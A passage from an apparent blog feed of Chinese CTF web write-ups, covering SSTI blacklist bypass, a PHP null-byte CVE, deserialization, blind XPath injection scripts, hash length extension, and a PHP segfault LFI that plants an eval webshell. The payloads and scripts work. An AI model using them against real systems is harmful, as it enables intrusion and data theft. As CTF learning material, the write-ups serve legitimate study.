class="string">"subprocess"</span>,<span class="string">"commands"</span>,<span class="string">"socket"</span>,<span class="string">"hex"</span>,<span class="string">"base64"</span>,<span class="string">"*"</span>,<span class="string">"?"</span>] </span><br><span class="line">  <span class="keyword">for</span> x <span class="keyword">in</span> black_list : </span><br><span class="line">    <span class="keyword">if</span> x <span class="keyword">in</span> str.lower() : </span><br><span class="line">        <span class="keyword">return</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><p>然后，<code>ls /</code><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">app bin boot dev etc home lib lib64 media mnt opt proc root run sbin srv sys this_is_the_flag.txt tmp usr var</span><br></pre></td></tr></table></figure></p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&#123;% for c in [].__class__.__base__.__subclasses__() %&#125;</span><br><span class="line">&#123;% if c.__name__ == &apos;catch_warnings&apos; %&#125;</span><br><span class="line">  &#123;% for b in c.__init__.__globals__.values() %&#125;</span><br><span class="line">  &#123;% if b.__class__ == &#123;&#125;.__class__ %&#125;</span><br><span class="line">    &#123;% if &apos;ev&apos;+&apos;al&apos; in b.keys() %&#125;</span><br><span class="line">      &#123;&#123; b[&apos;ev&apos;+&apos;al&apos;](&apos;__imp&apos;+&apos;ort__&apos;+&apos;(&quot;o&apos;+&apos;s&quot;)&apos;+&apos;.po&apos;+&apos;pen&apos;+&apos;(&quot;c&apos;+&apos;at /this_is_the_fl&apos;+&apos;ag.txt&quot;).read()&apos;) &#125;&#125;</span><br><span class="line">    &#123;% endif %&#125;</span><br><span class="line">  &#123;% endif %&#125;</span><br><span class="line">  &#123;% endfor %&#125;</span><br><span class="line">&#123;% endif %&#125;</span><br><span class="line">&#123;% endfor %&#125;</span><br></pre></td></tr></table></figure><blockquote><p><strong>class</strong>:获得当前对象的类<br><strong>bases</strong>:列出其基类<br><strong>mro</strong> :列出解析方法的调用顺序，类似于bases<br><strong>subclasses</strong>()：返回子类列表<br><strong>dict</strong> ： 列出当前属性/函数的字典<br>func_globals返回一个包含函数全局变量的字典引用</p></blockquote><h1 id="GKCTF2020-cve版签到"><a href="#GKCTF2020-cve版签到" class="headerlink" title="[GKCTF2020]cve版签到"></a>[GKCTF2020]cve版签到</h1><p>network：<br>hint:flag in localhost<br>tips:Host must be end with ‘123’  </p><p>让url=127.0.0.1<br>但是题目说<code>you can just view *.ctfhub.com</code><br>结合题目在php/7.3.15版本下寻找能绕过.ctfhub.com的cve<br><a href="http://vulhub.org.cn/vuln/VH-CVE-2020-7066" target="_blank" rel="noopener">CVE-2020-7066</a>  </p><blockquote><p>在低于7.2.29的PHP版本7.2.x，低于7.3.16的7.3.x和低于7.4.4的7.4.x中，将get_headers（）与用户提供的URL一起使用时，如果URL包含零（\ 0）字符，则URL将被静默地截断</p></blockquote><p><code>payload:?url=http://127.0.0.123%00.ctfhub.com</code></p>]]></content>
      
      
      <categories>
          
          <category> practice </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>links</title>
      <link href="/2020/07/12/links/"/>
      <url>/2020/07/12/links/</url>
      
        <content type="html"><![CDATA[<h1 id="vidar"><a href="#vidar" class="headerlink" title="vidar"></a>vidar</h1><p>re:<a href="https://www.scizapomi.top/" target="_blank" rel="noopener">m140</a>  </p><p>web:<a href="http://0727.site/" target="_blank" rel="noopener">0x4qe</a>  </p><p>pwn:<a href="https://www.xi4oyu.top/" target="_blank" rel="noopener">xi4oyu</a>  </p><p>re:<a href="http://r3n0.top/" target="_blank" rel="noopener">r3n0</a>  </p><p>web&amp;android:<a href="https://altonhe.github.io/" target="_blank" rel="noopener">trotsky</a>  </p><p>web:<a href="https://hikawa.ml/" target="_blank" rel="noopener">4k1Ra</a>  </p><p>web:<a href="http://47.97.221.205/" target="_blank" rel="noopener">r1nlang</a></p><p>acm&amp;design:<a href="https://wzyxv1n.top/" target="_blank" rel="noopener">稳赚</a></p><p>java:<a href="https://r000setta.github.io/" target="_blank" rel="noopener">r000setta</a></p><p>web:<a href="http://aw.gamison.top/" target="_blank" rel="noopener">GaMiSon</a></p><p>pwn:<a href="https://www.thesoldierjack.cn/" target="_blank" rel="noopener">d1gg12</a></p><h1 id="hdu"><a href="#hdu" class="headerlink" title="hdu"></a>hdu</h1><p><a href="https://l1near.top/" target="_blank" rel="noopener">l1near</a></p>]]></content>
      
      
      
    </entry>
    
    
    
    <entry>
      <title>Ha1cyon_CTF</title>
      <link href="/2020/04/19/Ha1cyon-CTF/"/>
      <url>/2020/04/19/Ha1cyon-CTF/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="查源码"><a href="#查源码" class="headerlink" title="查源码"></a>查源码</h2><p>如题  </p><h2 id="RealEzPHP"><a href="#RealEzPHP" class="headerlink" title="RealEzPHP"></a>RealEzPHP</h2><p>源码<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">#error_reporting(0);</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">HelloPhp</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $a;</span><br><span class="line">    <span class="keyword">public</span> $b;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;a = <span class="string">"Y-m-d h:i:s"</span>;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;b = <span class="string">"date"</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span><span class="params">()</span></span>&#123;</span><br><span class="line">        $a = <span class="keyword">$this</span>-&gt;a;</span><br><span class="line">        $b = <span class="keyword">$this</span>-&gt;b;</span><br><span class="line">        <span class="keyword">echo</span> $b($a);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">$c = <span class="keyword">new</span> HelloPhp;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'source'</span>]))</span><br><span class="line">&#123;</span><br><span class="line">    highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line">    <span class="keyword">die</span>(<span class="number">0</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">@$ppp = unserialize($_GET[<span class="string">"data"</span>]);</span><br></pre></td></tr></table></figure></p><p>反序列化<br>$b($a)=&gt;$b是个函数名<br>flag在phpinfo里<br>不过s:0:””;是不行的<br><img src="01.png" alt=""><br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">O:8:&quot;HelloPhp&quot;:2:&#123;s:1:&quot;a&quot;;s:2:&quot;-1&quot;;s:1:&quot;b&quot;;s:7:&quot;phpinfo&quot;;&#125;</span><br></pre></td></tr></table></figure></p><h2 id="ezlogin"><a href="#ezlogin" class="headerlink" title="ezlogin"></a>ezlogin</h2><h3 id="前导知识"><a href="#前导知识" class="headerlink" title="前导知识"></a>前导知识</h3><p>抓包信息发现xml请求=&gt;1.xxe 2.xpath盲注<br><a href="https://www.tr0y.wang/2019/05/11/XPath%E6%B3%A8%E5%85%A5%E6%8C%87%E5%8C%97/" target="_blank" rel="noopener">XPath注入指北</a><br><a href="https://www.cnblogs.com/backlion/p/8554749.html" target="_blank" rel="noopener">xpath注入详解</a><br><img src="03.png" alt=""><br>查询语句:<br>$query = “/root/users/user[username/text()=’”.$name.”‘ and password/text()=’”.$pwd.”‘]”;  </p><p>1.万能密码:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$name =&gt; admin&apos; or &apos;1</span><br><span class="line">$pwd =&gt;</span><br></pre></td></tr></table></figure></p><p>2.盲注</p><p>判断根节点数量：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name=&gt;&apos; or count(/)=1 or &apos;1</span><br></pre></td></tr></table></figure></p><p>count(/)=n若返回正常，则代表有n个根节点  </p><p>获取名字长度:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name=&gt;&apos; or string-length(name(/*[1]))=n or &apos;1</span><br></pre></td></tr></table></figure></p><p>若返回正常，则第一个根节点名长度为n</p><p>获取内容:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$name=&gt;&apos;or substring(name(/*[1]),1,1)=&apos;a&apos; or &apos;1</span><br></pre></td></tr></table></figure></p><p>逐个字符遍历第一个根节点名字的第一个字符 range(‘a’,’z’)<br>当返回正常时可确定其字符</p><h3 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h3><p>用户名输入 ‘or count(/)=n or ‘1测试是否能注入,n从1开始取<br>取1时显示非法操作，取2显示用户名或密码错误，存在注入<br>脚本来自<a href="http://phoebe233.cn/index.php/archives/35/" target="_blank" rel="noopener">NPUCTF ezlogin</a></p><blockquote><p>re.findall(pattern, string, flags=0)<br>返回string中所有与pattern相匹配的全部字串，返回形式为数组</p></blockquote><blockquote><p>登录界面需要保存session，否则会返回”请登录”信息，无法登录</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">sess = requests.session()</span><br><span class="line">strs=<span class="string">'abcdefghijklmnopqrstuvwxyzABCDEFZHIJKLMNOPQRSTUVWKYZ1234567890'</span></span><br><span class="line">headers = &#123;<span class="string">'Content-Type'</span>:<span class="string">'application/xml'</span>&#125;</span><br><span class="line">param=<span class="string">'&lt;input type="hidden" id="token" value="(.*?)" /&gt;'</span></span><br><span class="line"><span class="comment">#token会过期变化，所以用正则匹配任意token</span></span><br><span class="line">t=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">50</span>):</span><br><span class="line">    <span class="keyword">for</span> s <span class="keyword">in</span> strs:</span><br><span class="line">        url=<span class="string">'http://ha1cyon-ctf.fun:30015/login.php'</span></span><br><span class="line">        token=re.findall(param,sess.get(url).text)[<span class="number">0</span>]</span><br><span class="line"></span><br><span class="line">        <span class="comment">#str(i)代表第n个pos，pwd随意取值</span></span><br><span class="line">        <span class="comment">#第一个根节点为root</span></span><br><span class="line">        <span class="comment">#data="&lt;username&gt;' or substring(name(/*[1]), '"+str(i)+"', 1)='"+str(s)+"' or '1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;"+token+"&lt;/token&gt;"</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#第二个节点为accounts</span></span><br><span class="line">        <span class="comment">#data = "&lt;username&gt;' or substring(name(/root/*[1]), '" + str(i) + "', 1)='" + str(s) + "' or '1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;" + token + "&lt;/token&gt;"</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#第三个节点为user</span></span><br><span class="line">        <span class="comment">#data = "&lt;username&gt;' or substring(name(/root/accounts/*[1]), '" + str(i) + "', 1)='" + str(s) + "' or '1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;" + token + "&lt;/token&gt;"</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#遍历[1][2][3],在user节点下得到id，username，password</span></span><br><span class="line">        <span class="comment">#name(/root/accounts/user/*[1])</span></span><br><span class="line">        <span class="comment">#name(/root/accounts/user/*[2])</span></span><br><span class="line">        <span class="comment">#name(/root/accounts/user/*[3])</span></span><br><span class="line">        <span class="comment">#data = "&lt;username&gt;' or substring(name(/root/accounts/user/*[1]), '" + str(i) + "', 1)='" + str(s) + "' or '1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;" + token + "&lt;/token&gt;"</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#之后取user下的子节点username（user[1]），得到 gtfly123</span></span><br><span class="line">        <span class="comment">#取第二个子节点user[2]结果是adm1n</span></span><br><span class="line">        <span class="comment">#data = "&lt;username&gt;' or substring(/root/accounts/user[1]/username/text(), '" + str(i) + "', 1)='" + str(s) + "' or '1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;" + token + "&lt;/token&gt;"</span></span><br><span class="line"></span><br><span class="line">        <span class="comment">#求adm1n的密码</span></span><br><span class="line">        <span class="comment">#data = "&lt;username&gt;' or substring(/root/accounts/user[2]/password/text(), '" + str(i) + "', 1)='" + str(s) + "' or '1&lt;/username&gt;&lt;password&gt;123&lt;/password&gt;&lt;token&gt;" + token + "&lt;/token&gt;"</span></span><br><span class="line">        res=sess.post(url=url,headers=headers,data=data)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">'非法操作'</span> <span class="keyword">in</span> res.text:</span><br><span class="line">            t+=s</span><br><span class="line">            print(t)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure><p>格式为<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">root</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">accounts</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span>gtfly123<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span>&gt;</span>xxxxxxxxxx<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">user</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">id</span>&gt;</span><span class="tag">&lt;/<span class="name">id</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">username</span>&gt;</span>adm1n<span class="tag">&lt;/<span class="name">username</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">password</span>&gt;</span>xxxxxxxxx<span class="tag">&lt;/<span class="name">password</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">user</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">accounts</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">root</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>md5解密后登录后台，文件包含可用大小写绕过<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/admin.php?file=PhP://filter/Read=convert.basE64-encode/resource=/flag</span><br></pre></td></tr></table></figure></p><h2 id="ezinclude"><a href="#ezinclude" class="headerlink" title="ezinclude"></a>ezinclude</h2><p>hash拓展攻击,借助hashpump工具<a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">HashPump</a><br>example:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">input:hashpump -s &apos;6d5f807e23db210bc254a28be2d6759a0f5f5d99&apos; --data &apos;count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo&apos; -a &apos;&amp;waffle=liege&apos; -k 14</span><br><span class="line"></span><br><span class="line">output:</span><br><span class="line">0e41270260895979317fff3898ab85668953aaa2</span><br><span class="line">count=10&amp;lat=37.351&amp;user_id=1&amp;long=-119.827&amp;waffle=eggo\x80\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x02(&amp;waffle=liege</span><br></pre></td></tr></table></figure></p><p><del>这题好像当时给了两个hint说是喜欢放假flag?</del><br><img src="04.png" alt=""><br>可以联想到hash拓展攻击<br>在cookie里可以获取到hash值<br>但是没有提供密钥长度所以需要脚本爆破<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(<span class="number">1</span>,<span class="number">12</span>):</span><br><span class="line">    data=os.popen(<span class="string">'hashpump -s de73312423b835b22bfdc3c6da7b63e9 -d admin -k '</span>+str(i)+<span class="string">' -a admin'</span>).read()</span><br><span class="line">    name=data.split(<span class="string">'\n'</span>)[<span class="number">0</span>]</span><br><span class="line">    password=data.split(<span class="string">'\n'</span>)[<span class="number">1</span>].replace(<span class="string">'\\x'</span>,<span class="string">'%'</span>) <span class="comment">#urlencode</span></span><br><span class="line">    result=requests.get(<span class="string">'http://192.168.0.166/index.php?name='</span>+password+<span class="string">'&amp;pass='</span>+name).text</span><br><span class="line">    print(result)</span><br></pre></td></tr></table></figure></p><p>👆官方写的脚本，不过复现的时候失败了<br><img src="05.png" alt=""><br>官方应该是想借助原本不传值时的hash值来求出$name的值<br>不过直接传name的值然后得到对应的$pass也可以0.0<br><del>又感觉到思维的限制了</del><br>得到flflflflag.php<br>进入后有<br><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">html</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">head</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">script</span> <span class="attr">language</span>=<span class="string">"javascript"</span> <span class="attr">type</span>=<span class="string">"text/javascript"</span>&gt;</span><span class="undefined"></span></span><br><span class="line"><span class="javascript">        <span class="built_in">window</span>.location.href=<span class="string">"404.html"</span>;</span></span><br><span class="line"><span class="undefined">    </span><span class="tag">&lt;/<span class="name">script</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">title</span>&gt;</span>this_is_not_fl4g_and_出题人_wants_girlfriend<span class="tag">&lt;/<span class="name">title</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">head</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;&gt;</span></span><br><span class="line"></span><br><span class="line">    <span class="tag">&lt;<span class="name">body</span>&gt;</span></span><br><span class="line">        include($_GET["file"])<span class="tag">&lt;/<span class="name">body</span>&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;/<span class="name">html</span>&gt;</span></span><br></pre></td></tr></table></figure></p><p>在请求头里可以看见php的版本是7.0.33<br><a href="https://coomrade.github.io/2018/10/26/%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E7%9A%84%E4%B8%80%E4%BA%9Bgetshell%E5%A7%BF%E5%8A%BF/" target="_blank" rel="noopener">文件包含的一些getshell姿势</a><br><a href="https://www.jianshu.com/p/dfd049924258" target="_blank" rel="noopener">LFI via SegmentFault-王一航</a><br><a href="https://www.aqniukt.com/article/257" target="_blank" rel="noopener">自包含,php7segment fault相关</a></p><blockquote><p>这里要说的是在含有文件包含漏洞的地方，使用php://filter/string.strip_tags导致php7 segment fault，如果同时上传了一个文件，那么这个tmp file就会一直留在tmp目录(&lt;php7.2)，再进行文件名爆破就可以getshell<br>• php7.0.0-7.1.2可以利用， 7.1.2x版本的已被修复  </p></blockquote><p>• php7.1.3-7.2.1可以利用， 7.2.1x版本的已被修复  </p><p>• php7.2.2-7.2.8可以利用， 7.2.9一直到7.3到现在的版本已被修复<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"><span class="keyword">import</span> re</span><br><span class="line">file_data=&#123;</span><br><span class="line">    <span class="string">'file'</span>: <span class="string">"&lt;?php eval($_POST[1]);"</span></span><br><span class="line">&#125;</span><br><span class="line">url=<span class="string">"http://049de990-93c0-48da-85ac-5a028644acd9.node3.buuoj.cn/flflflflag.php?file=php://filter/string.strip_tags/resource=/etc/passwd"</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    r=requests.post(url=url,files=file_data,allow_redirects=<span class="keyword">False</span>)</span><br><span class="line"><span class="keyword">except</span>:</span><br><span class="line">        print(<span class="number">1</span>)</span><br></pre></td></tr></table></figure></p><p>官方说的是访问<a href="http://192.168.0.128:8105/dir.php" target="_blank" rel="noopener">http://192.168.0.128:8105/dir.php</a><br>就可以得到临时文件名<br><del>但是不能用扫描器也没有hint,dir.php哪来的</del><br><a href="http://049de990-93c0-48da-85ac-5a028644acd9.node3.buuoj.cn/flflflflag.php?file=/tmp/phpFqq1b1&amp;1=phpinfo()" target="_blank" rel="noopener">http://049de990-93c0-48da-85ac-5a028644acd9.node3.buuoj.cn/flflflflag.php?file=/tmp/phpFqq1b1&amp;1=phpinfo()</a>;<br>flag在phpinfo();里<br>所以👆直接访问就好</p><h2 id="验证🐎"><a href="#验证🐎" class="headerlink" title="验证🐎"></a>验证🐎</h2><p>源码<br><figure class="highlight js"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">const</span> express = <span class="built_in">require</span>(<span class="string">'express'</span>);</span><br><span class="line"><span class="keyword">const</span> bodyParser = <span class="built_in">require</span>(<span class="string">'body-parser'</span>);</span><br><span class="line"><span class="keyword">const</span> cookieSession = <span class="built_in">require</span>(<span class="string">'cookie-session'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> fs = <span class="built_in">require</span>(<span class="string">'fs'</span>);</span><br><span class="line"><span class="keyword">const</span> crypto = <span class="built_in">require</span>(<span class="string">'crypto'</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> keys = <span class="built_in">require</span>(<span class="string">'./key.js'</span>).keys;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">md5</span>(<span class="params">s</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> crypto.createHash(<span class="string">'md5'</span>)</span><br><span class="line">    .update(s)</span><br><span class="line">    .digest(<span class="string">'hex'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">saferEval</span>(<span class="params">str</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span> (str.replace(<span class="regexp">/(?:Math(?:\.\w+)?)|[()+\-*/&amp;|^%&lt;&gt;=,?:]|(?:\d+\.?\d*(?:e\d+)?)| /g</span>, <span class="string">''</span>)) &#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">null</span>;</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="keyword">return</span> <span class="built_in">eval</span>(str);</span><br><span class="line">&#125; <span class="comment">// 2020.4/WORKER1 淦，上次的库太垃圾，我自己写了一个</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> template = fs.readFileSync(<span class="string">'./index.html'</span>).toString();</span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">render</span>(<span class="params">results</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> template.replace(<span class="string">'&#123;&#123;results&#125;&#125;'</span>, results.join(<span class="string">'&lt;br/&gt;'</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> app = express();</span><br><span class="line"></span><br><span class="line">app.use(bodyParser.urlencoded(&#123; <span class="attr">extended</span>: <span class="literal">false</span> &#125;));</span><br><span class="line">app.use(bodyParser.json());</span><br><span class="line"></span><br><span class="line">app.use(cookieSession(&#123;</span><br><span class="line">  name: <span class="string">'PHPSESSION'</span>, <span class="comment">// 2020.3/WORKER2 嘿嘿，给👴爪⑧</span></span><br><span class="line">  keys</span><br><span class="line">&#125;));</span><br><span class="line"></span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Object</span>);</span><br><span class="line"><span class="built_in">Object</span>.freeze(<span class="built_in">Math</span>);</span><br><span class="line"></span><br><span class="line">app.post(<span class="string">'/'</span>, <span class="function"><span class="keyword">function</span> (<span class="params">req, res</span>) </span>&#123;</span><br><span class="line">  <span class="keyword">let</span> result = <span class="string">''</span>;</span><br><span class="line">  <span class="keyword">const</span> results = req.session.results || [];</span><br><span class="line">  <span class="keyword">const</span> &#123; e, first, second &#125; = req.body;</span><br><span class="line">  <span class="keyword">if</span> (first &amp;&amp; second &amp;&amp; first.length === second.length &amp;&amp; first!==second &amp;&amp; md5(first+keys[<span class="number">0</span>]) === md5(second+keys[<span class="number">0</span>])) &#123;</span><br><span class="line">    <span class="keyword">if</span> (req.body.e) &#123;</span><br><span class="line">      <span class="keyword">try</span> &#123;</span><br><span class="line">        result = saferEval(req.body.e) || <span class="string">'Wrong 